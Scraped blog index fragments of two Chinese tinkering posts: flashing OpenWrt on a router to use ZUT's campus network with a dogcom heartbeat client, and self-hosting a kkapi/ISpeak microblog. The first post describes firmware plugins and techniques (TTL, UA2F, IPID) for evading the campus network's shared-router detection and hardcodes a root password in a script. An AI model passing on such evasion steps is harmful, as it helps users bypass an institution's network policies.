使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#上传-breed--文件并刷入"},{"categories":["瞎折腾"],"content":"\r重启路由器进入 Breed拔掉路由器电源，用一根牙签类似的东西，插入路由器后面的 reset 孔不要松开，再插上电源，路由器灯会先闪一下，直到连续闪烁几次以后再松开 reset，这时路由器已经进入 breed 了，打开浏览器访问 192.168.1.1 就可以看到 Breed 的界面（网络图片仅供参考，系统信息可能不一样） 如果你在之后有不可挽回的错误操作，都可以通过以上操作进行复位重置。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:4","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#重启路由器进入-breed"},{"categories":["瞎折腾"],"content":"\r检查 MAC 地址进入 MAC 地址修改，通常你应该看到的前三个 MAC 地址应该是全0，这就需要刷入 一次之前的 eeprom.bin。（网络图片仅供参考） 进入固件更新 （界面同下面），勾选 EEPORM，选择文件 eeprom.bin，其他的都不要动，然后上传，根据提示更新，之后会重新回到 Breed 控制台。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:5","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#检查-mac-地址"},{"categories":["瞎折腾"],"content":"\r刷入 openwrt同样在 Breed 控制台选择固件更新 ，勾选固件，选择 Mi4C.bin openwrt 固件文件，根据提示上传安装。（网络图片仅供参考） 之后路由器灯会全灭，然后电源灯进入黄色闪烁的状态，就是正在安装，等待安装成功以后等会变成蓝色，之后就可以访问 192.168.1.1 进入openwrt 管理后台页面，默认密码为 password 。 说一下 Mi4C.bin 这个openw 的固件。这个固件来自前面提到的广东工业大学项目中的 issue，是一位同学自己找人定制的一份固件并且免费分享出来了，其中已经内置了 Dr.com 插件（用来发送心跳包）及防检测插件（ttl，ipid，cookieflash，ua2f 最新版），非常感谢这位同学的分享。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:7:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#刷入-openwrt"},{"categories":["瞎折腾"],"content":"\r配置 PPPoE 拨号前置条件：宿舍上面的AP接口插入路由器的 WAN 口 选择 网络 —\u003e 接口，点击 WAN 接口对应的 编辑（Edit）按钮。 下面图中是我的已经配置好的界面，初次进入应该是有个 WAN 和 WAN6 接口，它们两个的下面并不是我图中的 pppoe-wan，应该是 eht0.2。WAN6 接口是一个 DHCP IPV6 客户端，它和 WAN 接口是同一个物理接口，留着也不影响 。LAN 口尽量不要动。 通信协议选择 PPPoE 然后点击出现的切换协议按钮。然后根据下表填入信息 PAP/CHAP 用户名。校园网账号，前置知识中的\\r\\n****@***格式。 PAP/CHAP 密码。校园网密码。 其他的不用动，请仔细检查校园网账号和密码是否正确。之后点击保存退出后，点击界面右下角的保存并应用。 PPPoE 部分配置完成。但是校园网目前还不能用。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:7:1","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#配置-pppoe-拨号"},{"categories":["瞎折腾"],"content":"\r配置无线网络选择 网络 —\u003e 无线，如果提示已禁用就点击启用，只有一个你可以点击编辑的按钮。ESSID 就是设备搜索到的无线网名称。网络是 LAN 接口就不用动。 选择 无线安全 配置无线网密码，加密选择 WPA2-PSK 无线网络部分配置完成。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:7:2","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#配置无线网络"},{"categories":["瞎折腾"],"content":"\r配置管理后台密码192.168.1.1 管理后台默认密码 password 容易被进入，进入 系统 —\u003e 管理权，可以更改访问后台管理员的密码。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:7:3","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#配置管理后台密码"},{"categories":["瞎折腾"],"content":"\r校园网认证前置条件：配置好 PPPoE 拨号 在前面我们已经成功配置了 PPPoE 拨号，但是要记得校园网还要发送心跳包保证在线状态。这部分主要解决发送心跳包的问题。 还需要说一下，发送心跳包的主要原理来自 drcom-generic 项目，广工大项目中使用的 Dr.com 插件是这个项目的 openwrt 插件版本，并且现在刷入的 openwrt 固件自带的也是这个插件，我并没用使用成功。最终是结合了学校贴吧老哥使用的 dogcom 才成功，dogcom 则是前面那个项目的 C 语言实现版本。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#校园网认证"},{"categories":["瞎折腾"],"content":"\r删除 Dr.com 插件在使用 dogcom 之前，需要把之前的 Dr.com 插件删除，因为会造成重复发包的问题导致无法认证。 进入 系统 —\u003e 软件包，在界面中筛选器部分搜索 drcom 或者 gdut （记不清了），然后选择 已安装列表，搜索到的软件包点击移除按钮，自动移除未使用的依赖可以取消勾选。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:1","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#删除-drcom-插件"},{"categories":["瞎折腾"],"content":"\r通过 openwrt 提供的 ssh 连接路由器openwrt 安装成功以后其实就可以通过 ssh 连接路由器了，使用 MobaXterm 连接路由器。这时连接的地址是 192.168.1.1，用户名是 root，密码是你 openwrt 的管理后台密码 MobaXterm 使用 ssh 连接以后左边会自己创建一个 ftp 连接，就是图中的框框部分 上面蓝色选中的部分是当前的路径，可以修改当前所在路径，通过拖拽可以直接上传文件 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:2","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#通过-openwrt-提供的-ssh-连接路由器"},{"categories":["瞎折腾"],"content":"\r安装 dogcomdogcom 安装方式有两种， 一种是使用 openwrt 版本的通过 opkg 软件包管理器安装，另一种是通过 ftp 上传 dogcom 可执行文件到 /usr/bin/ 文件夹中。就算使用 opkg 软件包安装，两个最后的结果都是一样的，就是在 /usr/bin/ 文件夹中有一个 dogcom 的可执行文件。 方法一：使用 opkg 软件包安装 还是在系统 —\u003e 软件包界面，有一个上传软件包按钮，点击上传下载的压缩包 dogcom.zip 中的 dogcom_v1.6.2-1_mipsel_24kc.ipk，之后执行安装即可。 也可以通过 ftp 把文件上传到 /tmp 文件夹中，然后在控制台执行 text opkg install /tmp/dogcom_v1.6.2-1_mipsel_24kc.ipk\r方法二：通过 ssh 上传到指定目录 在左侧的 ftp 界面上面路径输入 /usr/bin 进入文件夹，然后拖动名为 dogcom 的文件上传到该目录。 通过以上方法两个方法上传安装 dogcom 以后，可以在控制台执行 text /usr/bin/dogcom -h\r测试软件是否可用，软件输出为 text root@iapp:~# /usr/bin/dogcom Drcom-generic implementation in C. Version: 1.6.2 Usage: dogcom -m \u003cdhcp/pppoe\u003e -c \u003cFILEPATH\u003e [options \u003cargument\u003e]... Options: --mode \u003cdhcp/pppoe\u003e, -m \u003cdhcp/pppoe\u003e set your dogcom mode --conf \u003cFILEPATH\u003e, -c \u003cFILEPATH\u003e import configuration file --bindip \u003cIPADDR\u003e, -b \u003cIPADDR\u003e bind your ip address(default is 0.0.0.0) --log \u003cLOGPATH\u003e, -l \u003cLOGPATH\u003e specify log file --daemon, -d set daemon flag --802.1x, -x enable 802.1x --eternal, -e set eternal flag --verbose, -v set verbose flag --help, -h display this help\r视为成功。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:3","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#安装-dogcom"},{"categories":["瞎折腾"],"content":"\r上传 dogcom 配置文件可以参考上一节安装 dogcom 的方法二，使用 ftp 上传 dogcom.conf 文件到 /usr/ 目录下。这个 dogcom.conf 内容是发送心跳包的配置文件，来源是通过 drcom-generic 项目教程，使用 Wireshark 软件进行抓包并使用 在线配置器 获得的，如果以后校园网配置更改还需要自行抓包测试。dogcom.conf 的内容如下 text server = '1.1.1.1' pppoe_flag = '\\x2f' keep_alive2_flag = '\\xdb'\r","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:4","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#上传-dogcom-配置文件"},{"categories":["瞎折腾"],"content":"\r配置 PPPoE 拨号文件在 ssh 中按照顺序执行以下指令，这一步十分的重要！！！： text cp /lib/netifd/proto/ppp.sh /lib/netifd/proto/ppp.sh_bak sed -i '/proto_run_command/i username=`echo -e \"$username\"`' /lib/netifd/proto/ppp.sh sed -i '/proto_run_command/i password=`echo -e \"$password\"`' /lib/netifd/proto/ppp.sh chmod 777 /usr/bin/dogcom\r之后就可以执行 text /usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d \u0026\rdogcom 会自动启用一个守护进程发送心跳包认证，为了保证每次路由器重启以后自动连接校园网并认证，建议在 openwrt 管理页面的 系统 —\u003e 计划任务 中添加本地启动脚本 text sleep 10 \u0026\u0026 /usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d \u0026\r","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:5","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#配置-pppoe-拨号文件"},{"categories":["瞎折腾"],"content":"\r查看校园网是否成功认证配置完成后，重启路由器，并请耐心等待若干分钟（3分钟内），重新回到 openwrt 管理页面的 网络 —\u003e 接口中，查看 WAN 接口 PPPoE 是否拨号成功，如果运行时间、发送、接受均有数据，并且 IPv4 获得的一个地址，则说明路由器已经可以上网了。 wan中，学号密码输入错误。 路由器的wan没有与校园网端口连接 网线断了，或者路由器坏了 压根没开通校园网 dogcom 插件中，校园网心跳配置已经更改 端口被学校网络中心拉黑了 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:8:6","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#查看校园网是否成功认证"},{"categories":["瞎折腾"],"content":"\r挖个坑","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:9:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#挖个坑"},{"categories":["瞎折腾"],"content":"\r校园网防检测常见的四种检测： 基于 IPv4 数据包包头内的 TTL 字段的检测（固定TTL） 基于 HTTP 数据包请求头内的 User-Agent 字段的检测(UA2F) DPI (Deep Packet Inspection) 深度包检测技术）（不常用） 基于 IPv4 数据包包头内的 Identification 字段的检测（rkp-ipid 设置 IPID） 基于网络协议栈时钟偏移的检测技术（防时钟偏移检测） Flash Cookie 检测技术（iptables 拒绝 AC 进行 Flash 检测 不常用） 大佬讲解文章：https://catalog.chn.moe/ 广东工业大学项目：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt#步骤六配置防检测 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:9:1","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#校园网防检测"},{"categories":["瞎折腾"],"content":"\r校园网经常掉线2022.10.31 更新 自己从网上找了一个检测断网并自动重新拨号的脚本，配合定时任务每天凌晨 4 点重启，已经用了 20 多天了感觉还不错，分享一波代码。可以在任意目录下创建一个 ping 文件夹（但是需要自己改下某些配置路径），下面的例子是在 /root/ping 目录里放的脚本。脚本包括产生的日志有三个文件： ping.sh。每间隔 SLEEP_SEC 时间测试两个外网地址能否访问，超过 PING_SUM 次数无法访问判断为拨号掉线，重启 wan 口进行拨号。产生的日志文件存放到 /root/ping/log.txt daemon.sh。检测 ping.sh 进程是否存活，如果不存在进程则重启进程；判断日志文件超过 50MB 清空日志文件。 ping.sh shell #!/bin/sh PING_SUM=5 #ping interval SLEEP_SEC=10 #连续重启网卡 REBOOT_CNT 次网络都没有恢复正常，重启软路由 #时间= (SLEEP_SEC * PING_SUM + 20) * REBOOT_CNT REBOOT_CNT=30 LOG_PATH=\"/root/ping/log.txt\" cnt=0 reboot_cnt=0 while : do ping -c 1 -W 1 114.114.114.114 \u003e /dev/null ret=$? ping -c 1 -W 1 223.6.6.6 \u003e /dev/null ret2=$? if [[ $ret -eq 0 || $ret2 -eq 0 ]] then echo 'Network OK!' cnt=0 reboot_cnt=0 else cnt=`expr $cnt + 1` echo -n `date '+%Y-%m-%d %H:%M:%S'` \u003e\u003e $LOG_PATH printf '-\u003e [%d/%d] Network maybe disconnected,checking again after %d seconds!\\r\\n' $cnt $PING_SUM $SLEEP_SEC \u003e\u003e $LOG_PATH printf '-\u003e [%d/%d] Network maybe disconnected,checking again after %d seconds!\\r\\n' $cnt $PING_SUM $SLEEP_SEC if [ $cnt == $PING_SUM ] then echo 'ifup wan!!!' \u003e\u003e $LOG_PATH echo 'ifup wan!!!' ifdown wan sleep 1 ifup wan cnt=0 #重连后，等待20秒再进行ping检测 sleep 20 #网卡重启超过指定次数还没恢复正常，重启软路由 reboot_cnt=`expr $reboot_cnt + 1` if [ $reboot_cnt == $REBOOT_CNT ] then echo -n `date '+%Y-%m-%d %H:%M:%S'` \u003e\u003e $LOG_PATH echo '-\u003e =============== reboot!' \u003e\u003e $LOG_PATH echo '-\u003e =============== reboot!' sshpass -p 132465 ssh -p 22 root@192.168.1.1 'reboot' fi fi fi sleep $SLEEP_SEC done\rdaemon.sh shell #!/bin/sh LOG_PATH=\"/root/ping/log.txt\" # 用ps获取ups进程数量 NUM=`ps | grep ping.sh | grep -v grep | wc -l` echo ${NUM} # 少于1，重启进程 if [ \"${NUM}\" -lt \"1\" ] then /root/ping/ping.sh \u003e /dev/null \u0026 echo -n `date '+%Y-%m-%d %H:%M:%S'` \u003e\u003e $LOG_PATH echo '-\u003e Ping daemon start' \u003e\u003e $LOG_PATH fi s=`du -k /root/ping/log.txt|awk '{print $1}'` if [ $s -gt 500000 ] then chengdatetime=`date \"+%Y-%m-%d %H:%M:%S\"` echo $chengdatetime\":log size is large than expected and cleaning is started\" \u003e\u003e $LOG_PATH cat /dev/null \u003e /root/ping/log.txt fi exit 0\r之后在 openwrt 的管理后台 —\u003e 系统 —\u003e 计划任务中添加 shell 0 4 * * * reboot 0 */1 * * * /root/ping/daemon.sh\r第一行是每天 4 点重启路由器，第二行是启动检测存活脚本（看好文件路径别错），可以自行设置计划运行时间。 分割线，以下是旧内容 这个我也遇到过了，不知道是什么原因，毕竟我自己用电脑连着认证时不时也会掉，但是也有搜到的下面的办法 https://blog.csdn.net/weixin_35251837/article/details/119553540 在 /etc/ppp/options 文件中添加 persist ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:9:2","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#校园网经常掉线"},{"categories":["瞎折腾"],"content":"\r完工读到这里相信你也费了好大的力气了，也恭喜你，至少你是一个善于坚持的人，请享用你的校园网吧。有问题可以在评论区提问。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:10:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#完工"},{"categories":["瞎折腾"],"content":"\r前言感觉原来的 Artitalk 说说不好康，在开往里发现好多博客都用的说说功能叫叨叨点啥，看了看作者的说说页面，可以插入图片和标签分类，还有仅自己可见的功能，感觉挺不错的（实际是自己想折腾）所以就整一个。自己在部署过程中实在是踩了不少的坑，而且作者的文档感觉写的也不算完善，所以打算自己记录一下。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:1:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#前言"},{"categories":["瞎折腾"],"content":"\r项目结构作者的文档中各种仓库链接属实给我跳晕了，最后理出来的项目分为以下部分： kkapi。是作为说说的后端部分，连接 MongoDB 数据库，还有一个kkadmin的管理页面 ISpeak。说说的主体部分，依赖于后端的 kkapi ，分为前端的展示页面，和一个对接后端的发布说说页面。 作者文档中给出很多部署方法，白嫖版的就是 vercel 后端 api + 管理界面 + MongoDB 提供的云服务，但是个人感觉 vercel 经常被墙，所以部署的 api 感觉也不会稳定，而且考虑到数据的存放问题，所以我选择的是都部署到自己服务器上。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:2:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#项目结构"},{"categories":["瞎折腾"],"content":"\r后端部署","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:3:0","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#后端部署"},{"categories":["瞎折腾"],"content":"\rDocker 安装 Mongodb安装可以参考菜鸟教程的 Docker 安装 MongoDB 。因为之前听过 MongoDB 的未授权访问，所以考虑到安全性问题，创建容器的时候添加 MONGO_INITDB_ROOT_USERNAME 和 MONGO_INITDB_ROOT_PASSWORD 设置用户的账号密码，开启Docker MongoDB 的身份验证。考虑到数据未来的迁移可以通过 -v 挂载宿主机的一个目录。可以修改默认端口再减少一些风险。最后我启动的命令如下 shell docker run -d --name mongodb \\ -p xxxxx:27017 \\ -v /my/own/datadir:/data/db \\ -e MONGO_INITDB_ROOT_USERNAME=mongoadmin \\ -e MONGO_INITDB_ROOT_PASSWORD=secret \\ --restart=always mongo\r之后可以使用工具测试一下连接。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:3:1","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#docker-安装-mongodb"},{"categories":["瞎折腾"],"content":"\rkkapi 部署和项目文档中的教程差不多，要注意使用的 node 版本请高于 16.0.0 首先克隆项目源码 git clone https://ghproxy.com/https://github.com/kkfive/kkapi-open.git 接下来项目需要安装的工具 yarn 和 pm2，分别是 npm i yarn -g npm i pm2 -g 然后安装项目所需依赖 yarn install 。 之后再执行 yarn build 编译项目。这里我的小鸡顶不住编译所以自己在本地编译传上去了💧。 在项目文件夹创建环境变量文件，格式如 env PORT=3000 DATABASE_URL=mongodb://127.0.0.1:27017/kkpaiopen?authSource=admin DATABASE_USER=mongoadmin DATABASE_PASSWORD=secret # 加密密钥 测试 SECRETKEY=xxxxxxxxxxxxxxx\r这里的数据库连接地址我原来还想使用MongoDB提供的免费云服务当数据库，但是没搞成功，所以最后使用了本地的 MongoDB，有大佬知道的可以指点一下。 使用 pm2 使用守护线程启动项目 pm2 start pm2.json 我启动项目遇到了 [PM2][WARN] Expect “restart_delay” to be a typeof [object Number], but now is [object String] 错误，这个错误原因是作者的 pm2.json 中的 restart_delay 值是字符串类型 60s 改成数值 60 就可以了。 测试项目是否成功启动 可以使用 lsof -i:端口 查看端口是否被监听判断项目是否成功启动。没成功的原因大概率是因为数据库连接地址、数据库账号密码不正确。 创建初始化用户 curl http://127.0.0.1:3000/api/user/init 创建的默认用户名和密码是 admin 和 123456，这个用户名密码用来登陆可视化的管理后台，并且用户似乎只能拥有一个。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:3:2","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#kkapi-部署"},{"categories":["瞎折腾"],"content":"\rkkapiadmin（可视化管理后台）参考官方文档中的教程，使用的 Vercel 部署的。这个墙不墙的就无所谓了，注意的坑有： 修改部署分支和生产分支为 vercel。 fork 作者仓库的时候记得把 only fork master 取消勾选。 之后登录就是用前面初始化的用户名密码，进入后台以后可以修改密码。登陆后台以后需要设置： ISpeak 标签。因为发布说说是需要选择标签的，标签中的背景颜色值是十六进制的颜色代码 添加用户token。需要注意！！！，添加的token的标题只能是 speak 不能是其他的，否则发布说说时会提示token不存在，发布时验证的就是字段为 speak 的token的值。 接下来可以在前端说说页面测试发布说说，发布说说需要输入后端 kkapi 地址、用户id （在管理后台可以找到）、token。网址：https://ispeak-biubiu.vercel.app/ 发布成功可以在后端看到发布的说说。 ","date":"2022-10-04","objectID":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/:3:3","series":null,"tags":["说说"],"title":"KKapi+ISpeak说说页面部署","uri":"/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/#kkapiadmin可视化管理后台"},{"categories":["瞎折腾"],"content":"\r前端部署我使用的是 Ispeak 搭配的 twikoo 评论，因为现在博客使用的就是 twikoo，省去了再部署评论的麻烦。根据ISpeak文档部分，ispeak 配置项中 comment 是一个回调函数，可以自行初始化评论，参照twikoo评论初始化的格式。我博客中的说说页面代码 html \u003cdiv id=\"tip\" style=\"text-align:center;\"\u003eipseak加载中\u003c/div\u003e \u003cdiv id=\"ispeak\"\u003e\u003c/div\u003e \u003clink rel=\"stylesheet\" href=\"https://cdn.staticfile.org/highlight.js/10.6.0/styles/atom-one-dark.min.css\" /\u003e \u003clink rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/ispeak@4.4.0/style.css\" /\u003e \u003cscript src=\"https://cdn.staticfile.org/highlight.js/10.6.0/highlight.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://cdn.staticfile.org/marked/2.0.0/marked.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://cdn.jsdelivr.net/npm/ispeak@4.4.0/ispeak.umd.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://cdn.staticfile.org/twikoo/1.6.7/twikoo.all.min.js\"\u003e\u003c/script\u003e \u003cscript\u003e var head = document.getElementsByTagName('head')[0] var meta = document.createElement('meta') meta.name = 'referrer' meta.content = 'no-referrer' head.appendChild(meta) if (ispeak) { ispeak.init({ el: '#ispeak', api: '这里是后端kkapi地址', author: '后端用户id', pageSize: 10, loading_img: 'https://bu.dusays.com/2021/03/04/d2d5e983e2961.gif', comment: function (speak) { const { _id, title, content } = speak // 4.4.0 之后在此回调函数中初始化评论 //这里是twikoo的初始化配置，如果使用其他评论可以在这里修改 twikoo.init({ el: '.ispeak-comment', // 默认情况下 ipseak 生成class为 ispeak-comment 的div path: '/shuoshuo/?q=' + _id, envId: \"twikoo后端地址\" }) } }) .then(function () { console.log('ispeak 加载完成') document.getElementById('tip').style.display = 'none' }) } else { document.getElementById('tip').innerHTML = 'ipseak依赖加载失败！' } \u003c/script\u003e\r更新一波。被人发现了说说的评论没有独立，自己改了下配置。 上面的代码加入了 32 和 37 行代码，其中 37 行 path 属性设置为你当前的说说页面路径加 q 参数，这个参数可能无所谓吧，但是 _id 是当前说说的唯一 